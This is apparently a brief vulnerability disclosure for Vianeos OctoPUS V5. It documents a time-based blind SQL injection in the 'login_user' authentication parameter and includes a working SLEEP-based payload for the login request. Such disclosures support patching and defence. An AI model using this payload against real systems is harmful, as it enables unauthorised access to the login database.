# vianeos-octopus_V5_SQLi




# Exploit Title: Vianeos OctoPUS 5 - 'login_user' SQLi
# Date: 01/07/2021
# Vendor Homepage: http://www.vianeos.com/en/home-vianeos/
# Software Link: http://www.vianeos.com/en/octopus/
# Version: > V5
# Tested on: Fedora / Apache2 / MariaDB




Octopus V5 SQLi

The "login_user =" parameter present in the POST authentication request is vulnerable to an Time Based SQLi as follow :

```
Parameter: login_user (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: signin_user=1&login_user=1' AND (SELECT 8860 FROM (SELECT(SLEEP(5)))xENj) AND 'OoKG'='OoKG&password_user=1
```
